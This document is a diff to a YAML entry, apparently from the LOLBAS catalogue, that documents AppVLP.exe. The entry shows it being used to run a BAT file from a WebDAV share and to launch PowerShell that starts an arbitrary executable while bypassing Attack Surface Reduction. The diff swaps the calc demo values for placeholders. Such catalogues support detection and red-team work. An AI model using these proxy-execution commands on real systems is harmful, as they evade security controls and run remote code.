@@ -1,28 +1,19 @@
 ---
 Name: Appvlp.exe
 Description: Application Virtualization Utility Included with Microsoft Office 2016
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: AppVLP.exe \\webdav\calc.bat
+  - Command: AppVLP.exe {PATH_SMB:.bat}
     Usecase: Execution of BAT file hosted on Webdav server.
-    Description: Executes calc.bat through AppVLP.exe
+    Description: Executes .bat file through AppVLP.exe
     Category: Execute
     Privileges: User
     MitreID: T1218
     OperatingSystem: Windows 10 w/Office 2016
     Tags:
       - Execute: CMD
-  - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe','', '', 'open', 1)"
-    Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
-    Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
-    Category: Execute
-    Privileges: User
-    MitreID: T1218
-    OperatingSystem: Windows 10 w/Office 2016
-    Tags:
-      - Execute: EXE
-  - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
+  - Command: AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)"
     Usecase: Local execution of process bypassing Attack Surface Reduction (ASR).
     Description: Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.
     Category: Execute
